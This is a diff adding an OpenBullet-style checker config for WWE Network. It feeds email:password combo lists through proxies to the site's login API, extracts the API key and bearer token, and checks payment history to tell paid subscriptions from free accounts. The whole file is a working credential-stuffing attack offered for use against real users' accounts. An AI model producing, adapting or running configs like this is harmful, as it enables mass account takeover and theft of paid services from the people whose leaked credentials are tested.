@@ -1,0 +1,89 @@
+[SETTINGS]
+{
+  "Name": "WWE Network",
+  "SuggestedBots": 1,
+  "LastModified": "2019-08-20T21:10:55.348574+01:00",
+  "AdditionalInfo": "",
+  "Author": "Pestilence",
+  "Version": "1.0.0",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://watch.wwe.com/" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3" 
+  HEADER "Host: watch.wwe.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Upgrade-Insecure-Requests: 1" 
+  HEADER "Sec-Fetch-Mode: navigate" 
+  HEADER "Sec-Fetch-User: ?1" 
+  HEADER "Sec-Fetch-Site: none" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+PARSE "<SOURCE>" LR "CLIENT_DICE_API_KEY='" "'" -> VAR "API" 
+REQUEST POST "https://dce-frontoffice.imggaming.com/api/v2/login" AutoRedirect=FALSE 
+  CONTENT "{\"id\":\"<USER>\",\"secret\":\"<PASS>\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: dce-frontoffice.imggaming.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 49" 
+  HEADER "Realm: dce.wwe" 
+  HEADER "x-api-key: <API>" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Origin: https://watch.wwe.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Referer: https://watch.wwe.com/signin" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "\"authorisationToken\"" 
+  KEYCHAIN Failure OR 
+    KEY "\"failedAuthentication\"" 
+PARSE "<SOURCE>" JSON "authorisationToken" -> VAR "Token" 
+REQUEST POST "https://dce-frontoffice.imggaming.com/api/v2/customer/history/payment" 
+  CONTENT "{}" 
+  CONTENTTYPE "application/json" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: application/json" 
+  HEADER "Host: dce-frontoffice.imggaming.com" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Content-Length: 2" 
+  HEADER "Sec-Fetch-Mode: cors" 
+  HEADER "Realm: dce.wwe" 
+  HEADER "Content-Type: application/json" 
+  HEADER "Authorization: Bearer <Token>" 
+  HEADER "x-api-key: <API>" 
+  HEADER "Origin: https://watch.wwe.com" 
+  HEADER "Sec-Fetch-Site: cross-site" 
+  HEADER "Referer: https://watch.wwe.com/account" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-US,en;q=0.9" 
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "licenceDescription\":\"- Stream every WWE pay-per-view LIVE\n- 10,000+ hours of video on demand\n- Anywhere, anytime on any device\"" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY ",\"historyItems\":[],\"" 
